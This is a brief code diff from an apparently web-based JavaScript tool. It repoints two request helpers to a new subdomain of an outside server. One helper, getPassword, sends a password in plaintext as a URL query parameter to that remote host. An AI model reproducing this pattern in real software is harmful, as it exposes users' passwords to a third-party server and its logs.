@@ -190,7 +190,7 @@ function getInfo(hostname, _callback) {
             typeof _callback === "function" ? _callback(this.responseText) : "";
         }
     };
-    xhttp.open("GET", "https://nick.s911.hqgmbh.eu/ping.php?h=" + hostname, true);
+    xhttp.open("GET", "https://wp-plugins.nick.s911.hqgmbh.eu/ping.php?h=" + hostname, true);
     xhttp.send();
 }
 function getPassword(password, _callback) {
@@ -200,7 +200,7 @@ function getPassword(password, _callback) {
             typeof _callback === "function" ? _callback(this.responseText) : "";
         }
     };
-    xhttp.open("GET", "https://nick.s911.hqgmbh.eu/password.php?p=" + password, true);
+    xhttp.open("GET", "https://wp-plugins.nick.s911.hqgmbh.eu/password.php?p=" + password, true);
     xhttp.send();
 }
 function validURL(str) {
